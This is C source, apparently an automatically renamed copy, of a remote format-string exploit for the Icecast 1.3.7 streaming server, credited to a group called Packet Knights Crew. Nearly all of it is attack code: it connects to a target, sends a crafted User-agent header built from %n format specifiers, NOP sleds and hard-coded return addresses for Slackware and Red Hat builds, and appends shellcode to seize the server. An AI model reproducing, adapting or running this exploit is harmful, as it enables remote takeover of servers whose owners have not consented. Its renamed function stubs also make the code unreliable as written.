#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  tl ;
struct target {char* member_0; char* member_1; char* member_2; char* member_3; char* member_4; int member_5; int member_6; int member_7; int member_8; int member_9; char* name; int xx; int one; int two; int three; int pad; char* addr1; char* addr2; char* addr3; char* addr4; } ;
struct TYPE_2__ {int /*<<< orphan*/  s_addr; } ;
struct sockaddr_in {int /*<<< orphan*/  sin_family; int /*<<< orphan*/  sin_port; TYPE_1__ sin_addr; } ;
struct sockaddr {int dummy; } ;
typedef  int /*<<< orphan*/  sk ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  SIGALRM ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int /*<<< orphan*/  FUNC0 (int) ; 
 int FUNC1 (char*) ; 
 char* code ; 
 int /*<<< orphan*/  FUNC2 (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC4 (int) ; 
 int /*<<< orphan*/  FUNC5 (char*) ; 
 int /*<<< orphan*/  ip ; 
 int /*<<< orphan*/  FUNC6 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC7 (char*,char,int) ; 
 int /*<<< orphan*/  FUNC8 (char*,...) ; 
 int /*<<< orphan*/  FUNC9 (int,char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC10 (int,char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC11 (int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int FUNC12 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC13 (char*,char*,char*,char*,char*,char*,char*,char*,char*,char*,char*,char*,char*) ; 
 int /*<<< orphan*/  FUNC14 (char*,char*) ; 
 int FUNC15 (char*) ; 
 int /*<<< orphan*/  try_it ; 

int FUNC16(int argc,char **argv){
   int s,i,sel;
   struct sockaddr_in sk;
   char sndbuff[9000],xx[9000],one[300],two[300],three[300],nop[1000],pad[100];
   struct target tl[]={
        {
           "icecast-1.3.7.tar.gz compiled on Slackware 7.0",
           "\x1c\xdb\x5f\xbf",
           "\x1d\xdb\x5f\xbf",
           "\x1e\xdb\x5f\xbf",
           "\x1f\xdb\x5f\xbf",
           123,
           136,
           96,
           2076,
           5
        },
        {
           "icecast-1.3.7.tar.gz compiled on Redhat 7.0",
           "\xd8\xd8\x5f\xbf",
           "\xd9\xd8\x5f\xbf",
           "\xda\xd8\x5f\xbf",
           "\xdb\xd8\x5f\xbf",
           116,
           159,
           96,
           2074,
           3
        }
   };

   FUNC8("Icecast 1.3.7 format bug exploit by |CyRaX| <cyrax@pkcrew.org\n");
   FUNC8("Packet Knights Crew | http://www.pkcrew.org/\n");

   if(argc<4){
      FUNC8("Usage : ./PKCicecast-ex <target> <port> <type>\n");
      FUNC8("types are :\n");
      for(i=0;i<(sizeof(tl)/sizeof(struct target));i++){
         FUNC8("%2i : %s\n",i,tl[i].name);
      }
      FUNC3(0);
   }

   sel=FUNC1(argv[3]);
   FUNC7(sndbuff,0,9000);
   FUNC7(xx,0,9000);
   FUNC7(one,0,300);
   FUNC7(two,0,300);
   FUNC7(three,0,300);
   FUNC7(pad,0,100);
   FUNC7(nop,'\x90',1000);
   nop[1000]=0;

   s=FUNC12(AF_INET,SOCK_STREAM,0);

   ip=FUNC5(argv[1]);
   sk.sin_addr.s_addr=ip;
   sk.sin_port=FUNC4(FUNC1(argv[2]));
   sk.sin_family=AF_INET;
   FUNC2(s,(struct sockaddr *)&sk,sizeof(sk));
   FUNC14(sndbuff,"GET / HTTP/1.0\n");
   FUNC10(s,sndbuff,FUNC15(sndbuff),0);

   for(i=0;i<=(tl[sel].xx*3);i+=3){
      FUNC6(xx+i,"%8x",3);
   }
   FUNC7(one,'\x90',tl[sel].one);
   FUNC7(two,'\x90',tl[sel].two);
   FUNC7(three,'\x90',tl[sel].three);
   FUNC6(one+FUNC15(one)-2,"\xeb\x02",2);
   FUNC6(two+FUNC15(two)-2,"\xeb\x02",2);
   FUNC6(three+FUNC15(three)-2,"\xeb\x02",2);
   FUNC7(pad,'X',tl[sel].pad);
   FUNC13(sndbuff,"User-agent: %s"
   "%s"
   "%s"
   "%s"
   "%s"
   "%s" /* the %8x */
   "%%n"
   "%s%%n"
   "%s%%n"
   "%s%%n"
   "%s"
   "%s\n\n"
   ,pad,tl[sel].addr1,tl[sel].addr2,tl[sel].addr3,tl[sel].addr4,
           xx,one,two,three,nop,code);
   FUNC10(s,sndbuff,FUNC15(sndbuff),0);
   FUNC8("We must sleep for 120 seconds. Waiting for icecast to do the statistic\n");
   FUNC0(120);
   FUNC11(SIGALRM,try_it);
   while(1)FUNC9(s,sndbuff,9000,0);
}